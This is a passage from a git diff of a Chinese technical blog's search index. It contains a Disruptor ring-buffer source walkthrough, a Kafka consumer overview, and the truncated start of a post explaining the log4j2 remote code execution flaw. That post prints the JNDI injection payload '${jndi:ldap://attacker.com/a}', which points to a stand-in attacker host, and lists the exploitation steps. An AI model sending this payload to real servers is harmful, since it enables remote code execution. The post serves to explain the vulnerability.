+<h2 id="四、源码导读"><a href="#四、源码导读" class="headerlink" title="四、源码导读"></a>四、源码导读</h2><h3 id="4-1-核心类"><a href="#4-1-核心类" class="headerlink" title="4.1 核心类"></a>4.1 核心类</h3><p><a href="https://github.com/LMAX-Exchange/disruptor/wiki/Introduction">https://github.com/LMAX-Exchange/disruptor/wiki/Introduction</a></p>
+<p>ringbuff上有指针，每个消费者都维护自己的一个指针，生产者共用一个指针。指针是由 Sequencer类来控制的假设buffsize=8，如果消费者在消费id7，生产者将生产id15（15-buffsize=7），是同一个位置，生产者阻塞，如果生产者在生产id7，消费者在消费id7，消费者阻塞</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/162762019.png" alt="流程图"></p>
+<h3 id="4-2-生产者端"><a href="#4-2-生产者端" class="headerlink" title="4.2 生产者端"></a>4.2 生产者端</h3><h4 id="4-2-1-申请序号"><a href="#4-2-1-申请序号" class="headerlink" title="4.2.1 申请序号"></a>4.2.1 申请序号</h4><p>调用 Sequencer#get ，直接看多生产者如果申请序号的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;n must be &gt; 0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> current;</span><br><span class="line">  <span class="keyword">long</span> next;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取当前发布序号</span></span><br><span class="line">    current = cursor.get();</span><br><span class="line">    next = current + n;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">long</span> wrapPoint = next - bufferSize;</span><br><span class="line">    <span class="comment">// gatingSequenceCache 这是 gatingSequence 的缓存，存入的是最小的消费者消费序列（有多个消费者）</span></span><br><span class="line">    <span class="keyword">long</span> cachedGatingSequence = gatingSequenceCache.get();</span><br><span class="line">		<span class="comment">// 生产者要覆盖未被消费的数据（生产者超过消费者一圈了）</span></span><br><span class="line">    <span class="keyword">if</span> (wrapPoint &gt; cachedGatingSequence || cachedGatingSequence &gt; current)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 获取最小的消费者序列</span></span><br><span class="line">      <span class="keyword">long</span> gatingSequence = Util.getMinimumSequence(gatingSequences, current);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (wrapPoint &gt; gatingSequence)</span><br><span class="line">      &#123;</span><br><span class="line">        LockSupport.parkNanos(<span class="number">1</span>); <span class="comment">// TODO, should we spin based on the wait strategy?</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">			<span class="comment">// 更新缓存</span></span><br><span class="line">      gatingSequenceCache.set(gatingSequence);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cursor.compareAndSet(current, next))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-2-2-写入数据"><a href="#4-2-2-写入数据" class="headerlink" title="4.2.2 写入数据"></a>4.2.2 写入数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> (E)entries[(<span class="keyword">int</span>)sequence &amp; indexMask];</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// dosomething</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-2-3发布"><a href="#4-2-3发布" class="headerlink" title="4.2.3发布"></a>4.2.3发布</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publish</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 将待发布的序列设为可用，这样消费者就可以消费这个序列了</span></span><br><span class="line">  setAvailable(sequence);</span><br><span class="line">  waitStrategy.signalAllWhenBlocking();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-消费者端"><a href="#4-3-消费者端" class="headerlink" title="4.3 消费者端"></a>4.3 消费者端</h3><p>Disruptor#start 启动，会在线程池里启动 EventProcessor，每个 EventHandler 对应一个 EventProcessor</p>
+<p>BatchEventProcessor 是 EventProcessor 的实现类，run方法里会轮训，是否有 event 可以被消费，如果可以就调用 EventHandler#onEvent 方法，触发消费者事件。</p>
+<p>重点看 BatchEventProcessor#run 方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 状态设为启动，是一个AtomicBoolean</span></span><br><span class="line">  <span class="keyword">if</span> (!running.compareAndSet(<span class="keyword">false</span>, <span class="keyword">true</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Thread is already running&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 清除中断</span></span><br><span class="line">  sequenceBarrier.clearAlert();</span><br><span class="line">	<span class="comment">// 判断一下消费者是否实现了LifecycleAware ,如果实现了这个接口，那么此时会发送一个启动通知</span></span><br><span class="line">  notifyStart();</span><br><span class="line"></span><br><span class="line">  T event = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">long</span> nextSequence = sequence.get() + <span class="number">1L</span>;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 获取最大可用的序号，表示在之前的都可以安全消费</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> availableSequence = sequenceBarrier.waitFor(nextSequence);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (nextSequence &lt;= availableSequence)</span><br><span class="line">        &#123;</span><br><span class="line">          event = dataProvider.get(nextSequence);</span><br><span class="line">          eventHandler.onEvent(event, nextSequence, nextSequence == availableSequence);</span><br><span class="line">          nextSequence++;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 记录对应消费者消费到哪里</span></span><br><span class="line">        sequence.set(availableSequence);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> TimeoutException e)</span><br><span class="line">      &#123;</span><br><span class="line">        notifyTimeout(sequence.get());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> AlertException ex)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果任务停止，就退出</span></span><br><span class="line">        <span class="keyword">if</span> (!running.get())</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable ex)</span><br><span class="line">      &#123;</span><br><span class="line">        exceptionHandler.handleEventException(ex, nextSequence, event);</span><br><span class="line">        sequence.set(nextSequence);</span><br><span class="line">        nextSequence++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">finally</span></span><br><span class="line">  &#123;</span><br><span class="line">    notifyShutdown();</span><br><span class="line">    <span class="comment">// 任务关闭</span></span><br><span class="line">    running.set(<span class="keyword">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>消费者在消费时候，需要判断其最大可消费的序列号，这个最大可消费序列号是通过 SequenceBarrier#waitFor 方法来实现的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">waitFor</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> AlertException, InterruptedException, TimeoutException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    		<span class="comment">// 判断是否中断，如果中断就抛出异常，这样上层捕捉，就可以停止 BatchEventProcessor</span></span><br><span class="line">        checkAlert();</span><br><span class="line">				<span class="comment">// 根据不同的策略获取可用的序列</span></span><br><span class="line">        <span class="keyword">long</span> availableSequence = waitStrategy.waitFor(sequence, cursorSequence, dependentSequence, <span class="keyword">this</span>);</span><br><span class="line">				<span class="comment">// 可用序列比申请的序列小，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (availableSequence &lt; sequence)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> availableSequence;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 如果是单生产者，直接返回 availableSequence；对于多生产者判断是否可用，不可用返回sequence-1</span></span><br><span class="line">        <span class="keyword">return</span> sequencer.getHighestPublishedSequence(sequence, availableSequence);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p><a href="https://github.com/LMAX-Exchange/disruptor">https://github.com/LMAX-Exchange/disruptor</a></p>
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>源码</tag>
+        <tag>disruptor</tag>
       </tags>
   </entry>
   <entry>
@@ -845,6 +845,86 @@
       </tags>
   </entry>
   <entry>
+    <title>kafka实现原理</title>
+    <url>/kafka-overview.html</url>
+    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>主要讲解 Consumer 相关知识</p>
+<h2 id="Kafka-背景和架构介绍"><a href="#Kafka-背景和架构介绍" class="headerlink" title="Kafka 背景和架构介绍"></a>Kafka 背景和架构介绍</h2><h3 id="Kafka-简介"><a href="#Kafka-简介" class="headerlink" title="Kafka 简介"></a>Kafka 简介</h3><p>Apache Kafka 是由 LinkedIn 采用 Scala 和 Java 开发的开源流处理软件（open-source stream-processing）平台，并捐赠给了Apache Software Foundation。该项目旨在提供统一的、高吞吐量、低延迟的平台来处理实时数据流。Kafka 可以通过 Kafka Connect 连接到外部系统，并提供了 Kafka Streams。Kafka 使用经过优化的二进制 TCP 协议，并使用抽象 “message set” 将消息分组以减少网络开销并且可以支撑更大的网络数据包，从而使Kafka可以将突发的随机消息写入流转换为线性写入。</p>
+<h3 id="Kafka-特性"><a href="#Kafka-特性" class="headerlink" title="Kafka 特性"></a>Kafka 特性</h3><p>Kafka 是一种分布式的，基于发布/订阅的消息系统，主要特性如下：</p>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>分布式</td>
+<td>多分区、多副本、多订阅者</td>
+</tr>
+<tr>
+<td>高性能</td>
+<td>高吞吐量、低延迟、高并发</td>
+</tr>
+<tr>
+<td>扩展性&amp;持久性</td>
+<td>数据持久化、Rebalance、水平扩展</td>
+</tr>
+</tbody></table>
+<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251943649.png" alt="baf84226480a6d98488db6d051f3f64f.png"></p>
+<h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><ul>
+<li>Broker</li>
+<li>Topic</li>
+<li>Partition</li>
+<li>Producer</li>
+<li>Consumer</li>
+<li>Consumer Group</li>
+</ul>
+<h2 id="Kafka-Consumer"><a href="#Kafka-Consumer" class="headerlink" title="Kafka Consumer"></a>Kafka Consumer</h2><p>相信大家对 Kafka 的整体架构已经很熟了，这里不多介绍了。下面我们重点看看 Kafka Consumer 的特性和一些值得学习的设计。</p>
+<h3 id="Consumer-Group"><a href="#Consumer-Group" class="headerlink" title="Consumer Group"></a>Consumer Group</h3><p>Consumer Group 是 Kafka 提供的可扩展且具有容错性的消费者机制。Consumer Group 定义一组 Consumer 实例，组内的所有 Consumer 协调在一起来消费订阅 Topic 的所有 Partition。主要有以下三个特性：</p>
+<ol>
+<li>Consumer Group 下可以有一个或多个 Consumer 实例。</li>
+<li>Group ID 唯一标识一个 Consumer Group。</li>
+<li>Consumer Group 下所有实例订阅的 Topic 的单个 Partition，只能分配给组内的某个 Consumer 实例消费。这个 Partition 当然也可以被其他的 Group 消费。</li>
+<li>Consumer Group 之间彼此独立，互不影响，它们能够订阅相同的 Topic 而互不干涉。</li>
+</ol>
+<p>基于此，Kafka 可以实现两种消息引擎模式，点对点模式和发布与订阅模式。传统的消息队列模型，消费了就删除，所有的 Consumer 都抢占式消费，伸缩性不好。传统的发布/订阅模型，消费者必须订阅 Topic 的所有分区，缺点也是伸缩性不好。而 Kafka 的 Consumer Group 设计很好地规避了这一点，且同时实现了两种消息引擎模式。</p>
+<h3 id="Offset-管理"><a href="#Offset-管理" class="headerlink" title="Offset 管理"></a>Offset 管理</h3><p>Kafka 中的每个 Partition 都由一系列有序的、不可变的消息组成，这些消息被连续的追加到 Partition 中。Partition 中的每个消息都有一个连续的序号，用于 Partition 唯一标识一条消息。</p>
+<p>Offset 记录着下一条将要发送给 Consumer 的消息的序号。</p>
+<h4 id="Offset-存储"><a href="#Offset-存储" class="headerlink" title="Offset 存储"></a>Offset 存储</h4><p>老版本 Consumer （0.9 版本之前）的位移存储是依托于 ZooKeeper 的，它会自动或手动地将位移数据提交到 ZooKeeper 中保存。当 Consumer 重启后，它能自动从 ZooKeeper 中读取位移数据，从而在上次消费截止的地方继续消费。这种设计使得 Kafka Broker 不需要保存位移数据，减少了 Broker 端需要持有的状态空间，因而有利于实现高伸缩性。</p>
+<p>但是 ZooKeeper 不适用于高频率的写操作，且这样与 ZooKeeper 的耦合太重了。新版本 Consumer 的 Offset 存储交给了 Kafka Topic，即将 Offset 当做一个消息发送给 Kafka，这个消息 Topic 叫做位移主题。当 Consumer 重启后，就从该 Topic 中获取最新的消息即可。</p>
+<p>位移主题的消息格式为 Key-Value 对，Key 为 &lt;Group ID，Topic，Partition&gt;，value 为 Offset 值、时间戳和用户自定义数据等。</p>
+<h4 id="Offset-提交"><a href="#Offset-提交" class="headerlink" title="Offset 提交"></a>Offset 提交</h4><p>Consumer 提交 Offset 的方式有两种：自动提交和手动提交。enable.auto.commit=true 表示开启自动提交，自动提交比较省事，但是把控 Consumer 的位移管理。</p>
+<p>如果选择了自动提交，就会出现这样一个问题，只要 Consumer 一直启动着，它就会无限期地向位移主题写入消息。假设 Consumer 当前消费到了某个主题的最新一条消息，位移是 100，之后该主题没有任何新消息产生，故 Consumer 无消息可消费了，所以位移永远保持在 100。由于是自动提交位移，位移主题中会不停地写入位移 100 的消息。Kafka 只需要保存最新的一条消息，之前的过期消息都可以删除。</p>
+<p>为了删除位移主题中的过期消息，Kafka 采用了一种 Compaction 策略。Compaction 策略有点类似于标记/整理垃圾回收算法，他会扫描唯一主题里面的消息，删除那些过期消息，并将剩下的消息整理到一起。具体过程如下图所示：</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251943694.png" alt="65698c51843aa79c4d4cd5a9d040695a.png"></p>
+<p>Kafka 提供了专门的后台线程定期地巡检待 Compact 的主题，看看是否存在满足条件的可删除数据。这个后台线程叫 Log Cleaner，如果该线程挂掉，就可能会出现位移主题无限膨胀占用过多磁盘空间的问题。</p>
+<h3 id="Rebalance"><a href="#Rebalance" class="headerlink" title="Rebalance"></a>Rebalance</h3><h4 id="发生时机"><a href="#发生时机" class="headerlink" title="发生时机"></a>发生时机</h4><ol>
+<li>组内成员数发生变化</li>
+<li>订阅的 Topic 个数发生变化</li>
+<li>订阅 Topic 的分区数发生变化</li>
+</ol>
+<h4 id="Group-Coordinator"><a href="#Group-Coordinator" class="headerlink" title="Group Coordinator"></a>Group Coordinator</h4><p>当所订阅的 Topic 下 Partition 数量发生变化，或 Consumer 数量发生变化，协调者就会执行 Rebalance 来重新调度 Consumer 与 Partition 的消费关系。在 Rebalance 过程中会发生 Stop The Word，因此要尽量避免 Rebalance。这里我们主要讨论下 Consumer 实例挂了而引发的 Rebalance。</p>
+<p>在正常情况下 Consumer 会定期向 Coordinator（协调者） 发送心跳请求。如果某个 Consumer 没有计时发送心跳情求，Coordinator 就会认为该 Consumer 挂了，并发起一轮新的 Rebalance。这里需要关注几个重要的 Consumer 端参数：</p>
+<ol>
+<li>session.timeout.ms，会话超时时间，该参数的默认值是 10 秒。即如果 Coordinator 在 10 秒之内没有收到 Group 下某 Consumer 实例的心跳，它就会认为这个 Consumer 实例已经挂了。</li>
+<li>heartbeat.interval.ms，心跳间隔，默认 3 秒。Rebalance 操作是通过心跳响应消息告知的。</li>
+<li>max.poll.interval.ms，拉取消息最大时间间隔，默认值是 5 分钟，表示你的 Consumer 程序如果在 5 分钟之内无法消费完 poll 方法返回的消息，那么 Consumer 会主动发起“离开组”的请求，Coordinator 也会开启新一轮 Rebalance。</li>
+</ol>
+<h4 id="Rebalance-问题"><a href="#Rebalance-问题" class="headerlink" title="Rebalance 问题"></a>Rebalance 问题</h4><p>stop the word</p>
+<p>不必要的资源释放</p>
+<h4 id="Kafka-1-1-优化"><a href="#Kafka-1-1-优化" class="headerlink" title="Kafka 1.1 优化"></a>Kafka 1.1 优化</h4><p>加入 prepare rebalance，实现延迟执行。避免因为灰度发布，导致频繁 rebalance 的问题 距离抢票系统</p>
+<h4 id="Kafka-2-3-优化"><a href="#Kafka-2-3-优化" class="headerlink" title="Kafka 2.3 优化"></a>Kafka 2.3 优化</h4><p>黏性 rebalance。记录 consumer 实例，下次还是这个机器占用 partition。 缺点：这样会造成资源的浪费。假设 parition 为 10，机器有 80 台，那么永远是某 10 台占用 partition。记录 consumer 实例强依赖于机器 ip，在云原生场景下，这样的策略可能不会起到作用，因为 ip 是不断变化的。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《深入理解Kafka：核心设计与实践原理》</p>
+<p><a href="https://kknews.cc/code/oko8r6p.html">https://kknews.cc/code/oko8r6p.html</a></p>
+]]></content>
+      <categories>
+        <category>中间件</category>
+      </categories>
+      <tags>
+        <tag>kafka</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>jvm参数</title>
     <url>/jvm-options.html</url>
     <content><![CDATA[<h2 id="X-与-XX-的区别"><a href="#X-与-XX-的区别" class="headerlink" title="-X 与 -XX 的区别"></a>-X 与 -XX 的区别</h2><blockquote>
@@ -1028,118 +1108,6 @@
       </tags>
   </entry>
   <entry>
-    <title>kafka实现原理</title>
-    <url>/kafka-overview.html</url>
-    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>主要讲解 Consumer 相关知识</p>
-<h2 id="Kafka-背景和架构介绍"><a href="#Kafka-背景和架构介绍" class="headerlink" title="Kafka 背景和架构介绍"></a>Kafka 背景和架构介绍</h2><h3 id="Kafka-简介"><a href="#Kafka-简介" class="headerlink" title="Kafka 简介"></a>Kafka 简介</h3><p>Apache Kafka 是由 LinkedIn 采用 Scala 和 Java 开发的开源流处理软件（open-source stream-processing）平台，并捐赠给了Apache Software Foundation。该项目旨在提供统一的、高吞吐量、低延迟的平台来处理实时数据流。Kafka 可以通过 Kafka Connect 连接到外部系统，并提供了 Kafka Streams。Kafka 使用经过优化的二进制 TCP 协议，并使用抽象 “message set” 将消息分组以减少网络开销并且可以支撑更大的网络数据包，从而使Kafka可以将突发的随机消息写入流转换为线性写入。</p>
-<h3 id="Kafka-特性"><a href="#Kafka-特性" class="headerlink" title="Kafka 特性"></a>Kafka 特性</h3><p>Kafka 是一种分布式的，基于发布/订阅的消息系统，主要特性如下：</p>
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>分布式</td>
-<td>多分区、多副本、多订阅者</td>
-</tr>
-<tr>
-<td>高性能</td>
-<td>高吞吐量、低延迟、高并发</td>
-</tr>
-<tr>
-<td>扩展性&amp;持久性</td>
-<td>数据持久化、Rebalance、水平扩展</td>
-</tr>
-</tbody></table>
-<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251943649.png" alt="baf84226480a6d98488db6d051f3f64f.png"></p>
-<h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><ul>
-<li>Broker</li>
-<li>Topic</li>
-<li>Partition</li>
-<li>Producer</li>
-<li>Consumer</li>
-<li>Consumer Group</li>
-</ul>
-<h2 id="Kafka-Consumer"><a href="#Kafka-Consumer" class="headerlink" title="Kafka Consumer"></a>Kafka Consumer</h2><p>相信大家对 Kafka 的整体架构已经很熟了，这里不多介绍了。下面我们重点看看 Kafka Consumer 的特性和一些值得学习的设计。</p>
-<h3 id="Consumer-Group"><a href="#Consumer-Group" class="headerlink" title="Consumer Group"></a>Consumer Group</h3><p>Consumer Group 是 Kafka 提供的可扩展且具有容错性的消费者机制。Consumer Group 定义一组 Consumer 实例，组内的所有 Consumer 协调在一起来消费订阅 Topic 的所有 Partition。主要有以下三个特性：</p>
-<ol>
-<li>Consumer Group 下可以有一个或多个 Consumer 实例。</li>
-<li>Group ID 唯一标识一个 Consumer Group。</li>
-<li>Consumer Group 下所有实例订阅的 Topic 的单个 Partition，只能分配给组内的某个 Consumer 实例消费。这个 Partition 当然也可以被其他的 Group 消费。</li>
-<li>Consumer Group 之间彼此独立，互不影响，它们能够订阅相同的 Topic 而互不干涉。</li>
-</ol>
-<p>基于此，Kafka 可以实现两种消息引擎模式，点对点模式和发布与订阅模式。传统的消息队列模型，消费了就删除，所有的 Consumer 都抢占式消费，伸缩性不好。传统的发布/订阅模型，消费者必须订阅 Topic 的所有分区，缺点也是伸缩性不好。而 Kafka 的 Consumer Group 设计很好地规避了这一点，且同时实现了两种消息引擎模式。</p>
-<h3 id="Offset-管理"><a href="#Offset-管理" class="headerlink" title="Offset 管理"></a>Offset 管理</h3><p>Kafka 中的每个 Partition 都由一系列有序的、不可变的消息组成，这些消息被连续的追加到 Partition 中。Partition 中的每个消息都有一个连续的序号，用于 Partition 唯一标识一条消息。</p>
-<p>Offset 记录着下一条将要发送给 Consumer 的消息的序号。</p>
-<h4 id="Offset-存储"><a href="#Offset-存储" class="headerlink" title="Offset 存储"></a>Offset 存储</h4><p>老版本 Consumer （0.9 版本之前）的位移存储是依托于 ZooKeeper 的，它会自动或手动地将位移数据提交到 ZooKeeper 中保存。当 Consumer 重启后，它能自动从 ZooKeeper 中读取位移数据，从而在上次消费截止的地方继续消费。这种设计使得 Kafka Broker 不需要保存位移数据，减少了 Broker 端需要持有的状态空间，因而有利于实现高伸缩性。</p>
-<p>但是 ZooKeeper 不适用于高频率的写操作，且这样与 ZooKeeper 的耦合太重了。新版本 Consumer 的 Offset 存储交给了 Kafka Topic，即将 Offset 当做一个消息发送给 Kafka，这个消息 Topic 叫做位移主题。当 Consumer 重启后，就从该 Topic 中获取最新的消息即可。</p>
-<p>位移主题的消息格式为 Key-Value 对，Key 为 &lt;Group ID，Topic，Partition&gt;，value 为 Offset 值、时间戳和用户自定义数据等。</p>
-<h4 id="Offset-提交"><a href="#Offset-提交" class="headerlink" title="Offset 提交"></a>Offset 提交</h4><p>Consumer 提交 Offset 的方式有两种：自动提交和手动提交。enable.auto.commit=true 表示开启自动提交，自动提交比较省事，但是把控 Consumer 的位移管理。</p>
-<p>如果选择了自动提交，就会出现这样一个问题，只要 Consumer 一直启动着，它就会无限期地向位移主题写入消息。假设 Consumer 当前消费到了某个主题的最新一条消息，位移是 100，之后该主题没有任何新消息产生，故 Consumer 无消息可消费了，所以位移永远保持在 100。由于是自动提交位移，位移主题中会不停地写入位移 100 的消息。Kafka 只需要保存最新的一条消息，之前的过期消息都可以删除。</p>
-<p>为了删除位移主题中的过期消息，Kafka 采用了一种 Compaction 策略。Compaction 策略有点类似于标记/整理垃圾回收算法，他会扫描唯一主题里面的消息，删除那些过期消息，并将剩下的消息整理到一起。具体过程如下图所示：</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251943694.png" alt="65698c51843aa79c4d4cd5a9d040695a.png"></p>
-<p>Kafka 提供了专门的后台线程定期地巡检待 Compact 的主题，看看是否存在满足条件的可删除数据。这个后台线程叫 Log Cleaner，如果该线程挂掉，就可能会出现位移主题无限膨胀占用过多磁盘空间的问题。</p>
-<h3 id="Rebalance"><a href="#Rebalance" class="headerlink" title="Rebalance"></a>Rebalance</h3><h4 id="发生时机"><a href="#发生时机" class="headerlink" title="发生时机"></a>发生时机</h4><ol>
-<li>组内成员数发生变化</li>
-<li>订阅的 Topic 个数发生变化</li>
-<li>订阅 Topic 的分区数发生变化</li>
-</ol>
-<h4 id="Group-Coordinator"><a href="#Group-Coordinator" class="headerlink" title="Group Coordinator"></a>Group Coordinator</h4><p>当所订阅的 Topic 下 Partition 数量发生变化，或 Consumer 数量发生变化，协调者就会执行 Rebalance 来重新调度 Consumer 与 Partition 的消费关系。在 Rebalance 过程中会发生 Stop The Word，因此要尽量避免 Rebalance。这里我们主要讨论下 Consumer 实例挂了而引发的 Rebalance。</p>
-<p>在正常情况下 Consumer 会定期向 Coordinator（协调者） 发送心跳请求。如果某个 Consumer 没有计时发送心跳情求，Coordinator 就会认为该 Consumer 挂了，并发起一轮新的 Rebalance。这里需要关注几个重要的 Consumer 端参数：</p>
-<ol>
-<li>session.timeout.ms，会话超时时间，该参数的默认值是 10 秒。即如果 Coordinator 在 10 秒之内没有收到 Group 下某 Consumer 实例的心跳，它就会认为这个 Consumer 实例已经挂了。</li>
-<li>heartbeat.interval.ms，心跳间隔，默认 3 秒。Rebalance 操作是通过心跳响应消息告知的。</li>
-<li>max.poll.interval.ms，拉取消息最大时间间隔，默认值是 5 分钟，表示你的 Consumer 程序如果在 5 分钟之内无法消费完 poll 方法返回的消息，那么 Consumer 会主动发起“离开组”的请求，Coordinator 也会开启新一轮 Rebalance。</li>
-</ol>
-<h4 id="Rebalance-问题"><a href="#Rebalance-问题" class="headerlink" title="Rebalance 问题"></a>Rebalance 问题</h4><p>stop the word</p>
-<p>不必要的资源释放</p>
-<h4 id="Kafka-1-1-优化"><a href="#Kafka-1-1-优化" class="headerlink" title="Kafka 1.1 优化"></a>Kafka 1.1 优化</h4><p>加入 prepare rebalance，实现延迟执行。避免因为灰度发布，导致频繁 rebalance 的问题 距离抢票系统</p>
-<h4 id="Kafka-2-3-优化"><a href="#Kafka-2-3-优化" class="headerlink" title="Kafka 2.3 优化"></a>Kafka 2.3 优化</h4><p>黏性 rebalance。记录 consumer 实例，下次还是这个机器占用 partition。 缺点：这样会造成资源的浪费。假设 parition 为 10，机器有 80 台，那么永远是某 10 台占用 partition。记录 consumer 实例强依赖于机器 ip，在云原生场景下，这样的策略可能不会起到作用，因为 ip 是不断变化的。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《深入理解Kafka：核心设计与实践原理》</p>
-<p><a href="https://kknews.cc/code/oko8r6p.html">https://kknews.cc/code/oko8r6p.html</a></p>
-]]></content>
-      <categories>
-        <category>中间件</category>
-      </categories>
-      <tags>
-        <tag>kafka</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>log4j2 远程执行漏洞原理与复现</title>
-    <url>/log4j2-rce.html</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>使用了 log4j2，2.0~ 2.14.1 版本的均有影响</p>
-<p><a href="https://news.ycombinator.com/item?id=29499867">像Steam，Apple iCloud</a>这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。</p>
-<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>引用了 log4j2 漏洞版本的服务器</p>
-<p>黑客服务器（ladp + http）</p>
-<p>从该请求中注入字符串的日志语句</p>
-<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><ol>
-<li>发送包含恶意字符串的请求（通过任何协议）</li>
-<li>服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），<code>$&#123;jndi:ldap://attacker.com/a&#125;</code></li>
-<li>该漏洞由此有效负载触发，服务器通过<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">“Java 命名和目录接口</a>“（JNDI）发出请求，<code>log4j</code> <code>attacker.com/a</code></li>
